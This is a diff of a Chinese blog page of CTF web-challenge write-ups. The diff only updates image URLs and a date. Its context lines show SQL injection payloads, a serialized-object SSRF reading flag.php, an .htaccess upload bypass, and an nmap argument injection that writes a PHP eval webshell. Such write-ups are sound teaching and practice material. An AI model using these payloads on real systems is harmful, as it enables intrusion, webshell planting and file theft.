@@ -205,7 +205,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210224152322090.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210224152322090.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -358,7 +358,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:
-                    2021-03-09
+                    2021-03-19
                 </div>
                 
 
@@ -424,7 +424,7 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
 <p>空格和=被过滤了，可以用()和like来代替</p>
 <p>这题试了一下应该是报错注入，需要用到<code>^</code>连接函数形成异或</p>
 <p>payload:<code>?username=admin&amp;password=admin&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210225090738803.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210225090738803.png"></p>
 <p>成功显示数据库</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 爆表</span>
 ?username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span>admin<span class="token string">'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('</span>geek<span class="token string">')))))%23
@@ -442,7 +442,7 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
 <h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>随便注册一个用户登录发现有URL中有<code>view.php?no=1</code>no参数，查看用户信息的时候会加载我们填的blog链接，这里存在SSRF漏洞</p>
 <pre class="line-numbers language-none"><code class="language-none">?no&#x3D;1 order by 4 #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210225214056503.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210225214056503.png"></p>
 <p>这里存在SQL注入</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 爆表名</span>
 <span class="token operator">/</span><span class="token keyword">view</span><span class="token punctuation">.</span>php?<span class="token keyword">no</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>make_set<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'~'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span>
@@ -455,10 +455,10 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
 <span class="token operator">/</span><span class="token keyword">view</span><span class="token punctuation">.</span>php?<span class="token keyword">no</span><span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>make_set<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'~'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">data</span> <span class="token keyword">from</span> users<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210226110135769.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210226110135769.png"></p>
 <p>用御剑扫描目录发现有user.php.bak，robots.txt里面也有这个php备份文件</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210226105401195.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210226105310787.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210226105401195.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210226105310787.png"></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
 
@@ -508,11 +508,11 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
 <p>构造SQL语句如下：<br>过滤了union select用<code>/ ** /</code>可以绕过</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>view<span class="token operator">.</span>php<span class="token operator">?</span>no<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token comment">/**/</span>union<span class="token comment">/**/</span>select<span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'O:8:"UserInfo":3:&#123;s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;'</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210226111759577.png" alt="base64解密即可得到flag"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210226111759577.png" alt="base64解密即可得到flag"></p>
 <p>在网上发现一个非常简单的解法，用到了一个load_file函数，可有直接在源码里面查看到flag</p>
 <pre class="line-numbers language-none"><code class="language-none">&#x2F;view.php?no&#x3D;0 union&#x2F;**&#x2F;select 1,load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;),3,4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210228154112769.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210228154112769.png"></p>
 <p>原因：受到secure_file_priv对文件读写的影响</p>
 <p>secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p>
 <ul>
@@ -616,7 +616,7 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
 <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210228171703585.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210228171703585.png"></p>
 <p>base64decode:<code>&lt;?php $flag=&#39;flag&#123;a1e1e136-3615-4545-a04c-74da6c7aa73d&#125;&#39;;</code></p>
 <h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>好像上传什么都不行</p>
 <p>这题和upload labs有题一样，是.htaccess绕过</p>
@@ -624,9 +624,9 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
 <p>.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
 </blockquote>
 <p>.htaccess可以把.jpg文件解析成.php文件</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210228182552765.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210228182552765.png"></p>
 <p>再上传个图片马连上去就OK</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210228183159775.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210228183159775.png"></p>
 <h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><blockquote>
 <p>在查询的数据不存在的情况下，联合查询会构造一个虚拟的数据</p>
 </blockquote>
@@ -635,9 +635,9 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
 <p>base32decode:<code>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</code></p>
 <p>base64decode:<code>select * from user where username = &#39;$name&#39;</code></p>
 <p>可以判断注入点在name这里，一共三个字段，通过判断可以得知name的所在的字段为<strong>2</strong>，但一般的字符会提示用户名错误，只有为admin的时候才有sql语句报错。passwd的字段应该就是<strong>3</strong>了，But,当字段3中提交的pw和表单中提交的pw一样的情况下还是会报错，试了一下把前面的pw进行MD5加密就可以了，应该是在导入数据库的时候把密码进行了MD5加密。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210301154418343.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210301154418343.png"></p>
 <h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>和那个强网杯的堆叠注入好像差不多</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210301162058010.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210301162058010.png"></p>
 <p>但是一些关键字被过滤了</p>
 <p>查了一下，发现mysql有个语句没被过滤的可以查看<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">官方文档</a></p>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">HANDLER tbl_name OPEN [ [AS] alias]
@@ -766,7 +766,7 @@ files <span class="token operator">=</span> os<span class="token punctuation">.<
 <pre class="line-numbers language-none"><code class="language-none">?host&#x3D;&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这个命令的输入是可控的，通过nmap写个木马进去，根据返回的文件路径连接上去就行了</p>
-<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210306104530832.png" alt="image-20210306104530832"></p>
+<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210306104530832.png" alt="image-20210306104530832"></p>
 <p>在这里试了一些常见的账号密码都不行，点击help发现url变成了<code>http://780e4c0e-2a61-4620-8ac8-f2acd57f0d0d.node3.buuoj.cn/Download?filename=help.docx</code>可能存在文件包含，但这是java的，自己没做过，查找资料发现有个WEB-INF/web.xml泄露</p>
 <blockquote>
 <p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：</p>
@@ -777,12 +777,12 @@ files <span class="token operator">=</span> os<span class="token punctuation">.<
 <p>   /WEB-INF/database.properties：数据库配置文件</p>
 <p>漏洞成因：通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p>
 </blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210306105407809.png" alt="image-20210306105407809"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210306105407809.png" alt="image-20210306105407809"></p>
 <p>flag可能在那个文件中访问试试</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210306105659682.png" alt="image-20210306105659682"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210306105659682.png" alt="image-20210306105659682"></p>
 <p>这段base64解码应该就是了</p>
 <h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>扫描网站目录发现有<code>.git</code>源码泄露</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210308150406235.png" alt="下载下来发现如下文件"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210308150406235.png" alt="下载下来发现如下文件"></p>
 <p>有用的就是那两个php文件了</p>
 <p>flag.php:</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -951,7 +951,7 @@ files <span class="token operator">=</span> os<span class="token punctuation">.<
                 <a href="/2021/lou-dong/ssti-mo-ban-zhu-ru/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210302221112050.png" class="responsive-img" alt="SSTI模板注入">
+                        <img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210302221112050.png" class="responsive-img" alt="SSTI模板注入">
                         
                         <span class="card-title">SSTI模板注入</span>
                     </div>
@@ -999,7 +999,7 @@ files <span class="token operator">=</span> os<span class="token punctuation">.<
                 <a href="/2021/linux/archlinux/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208205844005.png" class="responsive-img" alt="Archlinux">
+                        <img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208205844005.png" class="responsive-img" alt="Archlinux">
                         
                         <span class="card-title">Archlinux</span>
                     </div>
